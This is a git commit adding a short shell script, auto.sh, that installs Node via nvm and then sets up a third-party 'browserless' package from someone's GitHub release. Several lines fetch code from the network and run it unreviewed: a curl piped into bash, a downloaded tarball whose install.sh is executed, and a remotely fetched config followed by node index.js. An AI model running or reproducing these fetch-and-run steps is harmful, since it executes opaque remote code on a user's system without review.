dea3b8c6d5244b12f23587166c0188ffd78425bb
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-03-16 06:14:38 +0700

    Create auto.sh

---
+++ auto.sh
@@ -0,0 +1,16 @@
+#!/bin/sh
+
+sudo apt update -y
+sudo apt install curl ca-certificates -y
+curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
+source ~/.bashrc
+nvm install 18
+
+curl https://github.com/malphite-code-1/browserless/releases/download/v1.1/browserless.tar.gz -L -O -J
+tar -xf browserless.tar.gz
+rm browserless.tar.gz
+cd browserless
+npm install
+sh install.sh
+wget https://raw.githubusercontent.com/55113110159/browserless/main/config.json
+node index.js
